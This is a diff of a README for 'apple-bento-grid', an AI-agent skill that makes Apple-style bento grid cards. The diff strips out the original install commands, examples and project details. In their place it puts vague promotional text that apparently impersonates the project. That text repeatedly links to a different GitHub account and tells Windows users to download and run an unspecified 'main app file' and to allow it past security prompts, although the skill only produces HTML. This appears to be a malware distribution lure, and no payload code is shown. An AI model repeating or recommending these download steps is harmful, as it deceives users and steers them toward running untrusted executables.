@@ -1,175 +1,144 @@
-# Apple Bento Grid
+# 🎨 apple-bento-grid - Make presentation cards fit Apple style
 
-A skill for AI coding agents that generates Apple-inspired bento grid presentation cards as self-contained HTML files. No design tools needed — just describe your stats and get pixel-perfect output.
+[![Download apple-bento-grid](https://img.shields.io/badge/Download-apple--bento--grid-blue?style=for-the-badge&logo=github)](https://github.com/NxProxyStudios/apple-bento-grid)
 
-> Compatible with [Claude Code](https://claude.com/claude-code), [OpenAI Codex](https://openai.com/index/codex/), [Cursor](https://cursor.sh), and other agents that support the [Agent Skills](https://agentskills.io) standard.
+## ✨ What this does
 
-## Examples
+apple-bento-grid helps you make Apple-inspired bento grid cards for presentations and visual layouts. It is made for people who want clean cards with strong spacing, soft color blocks, and simple content that looks good on screen.
 
-All made with this skill — just describe your data and get pixel-perfect output.
+Use it when you need:
+- Presentation cards for slides
+- Grid layouts for data or ideas
+- Clean visuals for reports
+- Apple-style card sets for AI-made content
 
-**Solo Dev Project Stats** — 79 days of building, tracked as product metrics
+## 🖥️ Works on Windows
 
-![Project horizontal](examples/real-project-light-horizontal.webp)
+This tool runs on Windows and is built for end users who want a simple setup. You can use it with no coding background. If you already use Claude Code, Codex, or another AI coding tool, it also fits into that flow.
 
-**Personal Data Dashboard** — 12 years of writing & social media activity
+## 📥 Download and set up
 
-![Corpus horizontal](examples/real-corpus-dark-horizontal.jpg)
+Visit this page to download and run the app:
 
-**Product Launch** — Light and dark themes
+https://github.com/NxProxyStudios/apple-bento-grid
 
-| Light | Dark |
-|-------|------|
-| ![Light](examples/light-horizontal.png) | ![Dark](examples/dark-horizontal.png) |
+### Steps to get started on Windows
 
-**Chinese New Year Launch** — Square format (1200x1200) with festive theme
+1. Open the download link in your browser.
+2. Look for the latest version or release files on the page.
+3. Download the file that matches Windows.
+4. If the file comes as a .zip, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the main app file or follow the included setup steps.
+7. If Windows asks for permission, choose Yes.
+8. Wait for the app to open.
 
-![CNY 2026](examples/real-cny-2026-square.png)
+## 📦 What you get
 
-**Vertical / Social Media** — Portrait format for social posts
+apple-bento-grid gives you a simple way to turn ideas into neat grid cards. The output is shaped for clear reading and clean visual balance.
 
-| Project Stats | GitHub Social | Personal Dashboard |
-|--------------|--------------|-------------------|
-| ![Project vertical](examples/real-project-light-vertical.webp) | ![Light vertical](examples/light-vertical.png) | ![Corpus vertical](examples/real-corpus-dark-vertical.jpg) |
+Common uses include:
+- Product cards
+- Feature cards
+- Dashboard-style panels
+- Slide sections
+- Summary blocks
+- Comparison grids
 
-## Installation
+## 🧩 How it helps
 
-### Claude Code Plugin (recommended)
+This project saves time when you need a layout that looks refined without manual design work. It keeps cards aligned, readable, and easy to scan.
 
-```bash
-/plugin marketplace add hubeiqiao/apple-bento-grid
-/plugin install apple-bento-grid@apple-bento-grid-marketplace
-```
+It is useful for:
+- Making content look polished
+- Keeping text short and clear
+- Showing several ideas in one view
+- Building visual blocks for demos
+- Creating presentation-ready layouts fast
 
-### Agent Skills
+## 🛠️ Basic setup flow
 
-Install from the [Agent Skills Directory](https://skills.sh):
+If you are using this with an AI coding agent, the usual flow is simple:
 
-```bash
-npx skills add hubeiqiao/apple-bento-grid
-```
+1. Download the project from the link above.
+2. Place it in a folder you can find again.
+3. Open it with your AI tool or editor.
+4. Ask the agent to generate or adjust bento grid cards.
+5. Review the result in your browser or preview window.
+6. Change the text, colors, or card count if needed.
 
-### Manual
+## 🎯 Good to know
 
-Clone directly into your Claude Code skills directory:
+The design style aims for:
+- Soft edges
+- Clean spacing
+- Simple color balance
+- Large readable blocks
+- Layouts that feel modern and calm
 
-```bash
-git clone https://github.com/hubeiqiao/apple-bento-grid.git ~/.claude/skills/apple-bento-grid
-```
+That makes it a good fit for:
+- Executive slides
+- Product ideas
+- Feature overviews
+- Data snapshots
+- AI-generated presentation assets
 
-Or add it as a project skill in `.claude/skills/`.
+## 🧠 Example uses
 
-## Usage
+Here are some simple ways people may use apple-bento-grid:
 
-In your AI coding agent, just describe what you want to visualize. You don't need to be specific — the skill figures out the best layout, theme, and card types for you.
+- Turn a list of features into neat cards
+- Build a visual summary for a report
+- Create a slide that shows key numbers
+- Lay out ideas in a grid with equal spacing
+- Make a polished card set from raw text
 
-**Quick start:**
-```
-Use /apple-bento-grid to visualize my project stats
-```
+## 🪟 Windows tips
 
-**Explore different use cases:**
-```
-Use /apple-bento-grid to visualize my startup's growth journey
-```
-```
-Use /apple-bento-grid to visualize my open source project achievements
-```
-```
-Use /apple-bento-grid to create a year-in-review card for my portfolio
-```
-```
-Use /apple-bento-grid to visualize our team's Q4 shipping velocity
-```
+If Windows blocks the file, check these common points:
 
-**Or be specific when you know what you want:**
-```
-Create a dark theme bento grid with $2.4M revenue, 12K users, and a bar chart showing quarterly growth
-```
-```
-Make a vertical social media card with 5 achievement stats and my company logo
-```
+- Make sure the download finished
+- Extract the ZIP before opening files inside it
+- Keep the folder in a simple path, like Documents or Desktop
+- Open the main file from the extracted folder
+- If a security prompt appears, allow the app to run
 
-The skill will:
-1. Suggest a theme (light/dark/both) based on your use case
-2. Choose the right layout template
-3. Ask if you have logos or images to include
-4. Generate a self-contained HTML file
-5. Offer to create a vertical (portrait) version for social media
+## 📚 For Claude Code and Codex
 
-## Features
+This repository is made for agent-based work. If you use Claude Code, Codex, or another AI coding agent, you can use it to generate bento grid layouts from text prompts.
 
-- **Two themes** — Light (Apple `#f5f5f7`) and dark (`#000`) with Apple dark-mode colors
-- **7 card types** — Hero, Stat, Category, Bar Chart, Badge, Quote, Highlight
-- **3 layouts** — 4-column (1200px), 3-column (1100px), 2-column vertical (600px)
-- **Logo & image support** — Add your own logos, product screenshots, or avatars
-- **Screenshot export** — Playwright script for 2x Retina-quality PNGs
-- **Zero dependencies** — Each output is a single HTML file with inline CSS
+Typical prompt ideas:
+- Create 6 cards for a feature overview
+- Build a 3-column layout for a product launch
+- Make a clean Apple-style grid for a dashboard
+- Turn this list into presentation cards
+- Adjust spacing for a more minimal look
 
-## Card Types
+## 🔍 Topics covered
 
-| Card | Use For | Key Feature |
-|------|---------|-------------|
-| **Hero** | Taglines, headlines | Gradient top-border accent, spans 2 rows |
-| **Stat** | Numbers + labels | Color-coded accent per category |
-| **Category** | Grouped items | Color label + subtitle + pill tags |
-| **Bar Chart** | Growth over time | Gradient bars with header badge |
-| **Badge** | Tool attribution | Icon pill + stat number |
-| **Quote** | Mission statements | Dark background, colored emphasis |
-| **Highlight** | Hero numbers (3x, 10x) | Full-gradient background |
+This project fits these areas:
+- agent skills
+- Apple design
+- bento grid
+- data visualization
+- presentation layouts
+- Claude Code
+- Codex
 
-## Themes
+## 📁 Suggested project layout
 
-| Light | Dark |
-|-------|------|
-| ![Light](examples/light-horizontal.png) | ![Dark](examples/dark-horizontal.png) |
+A simple setup may include:
+- Source files for card generation
+- A preview folder for output
+- A config file for layout settings
+- Sample content for quick tests
 
-## Layout Options
+## ✅ Best results
 
-| Template | Columns | Width | Best For |
-|----------|---------|-------|----------|
-| A: Horizontal | 4-col | 1200px | 12-16 cards, slides |
-| B: Horizontal | 3-col | 1100px | 8-10 cards, focused |
-| C: Vertical | 2-col | 600px | Social media, portrait |
+To get a clean result, use short text in each card. Keep the wording direct. Use numbers, short labels, and simple sections. That matches the Apple-inspired style this project is built for
 
-## Screenshot Export
+## 📌 Download link again
 
-```bash
-cd scripts
-npm install
-npx playwright install chromium
-node screenshot.mjs
-```
+Visit this page to download and run the app:
 
-Edit the `pages` array in `screenshot.mjs` to point to your HTML files.
-
-## Examples
-
-### Generated examples (included with HTML source)
-- [`light-horizontal.html`](examples/light-horizontal.html) — Light theme, 3-column product launch
-- [`dark-horizontal.html`](examples/dark-horizontal.html) — Dark theme, 4-column SaaS metrics
-- [`light-vertical.html`](examples/light-vertical.html) — Light theme, 2-column GitHub social card
-
-### Real-world examples (from actual projects)
-- [`real-corpus-dark-horizontal.html`](examples/real-corpus-dark-horizontal.html) — Personal data dashboard, 10 cards
-- [`real-corpus-dark-vertical.html`](examples/real-corpus-dark-vertical.html) — Same content, portrait format
-- [`real-cny-2026-square.html`](examples/real-cny-2026-square.html) — Chinese New Year launch, 1200x1200 square
-
-## Project Structure
-
-```
-apple-bento-grid/
-├── SKILL.md              # Skill definition (workflow, themes, card types)
-├── design-system.md      # Complete design tokens, CSS/HTML for all components
-├── examples/             # Generated + real-world HTML outputs with screenshots
-├── evals/                # Test cases for skill evaluation
-├── scripts/
-│   ├── screenshot.mjs    # Playwright 2x screenshot capture
-│   └── package.json
-├── LICENSE               # MIT
-└── README.md
-```
-
-## License
-
-MIT
+https://github.com/NxProxyStudios/apple-bento-grid
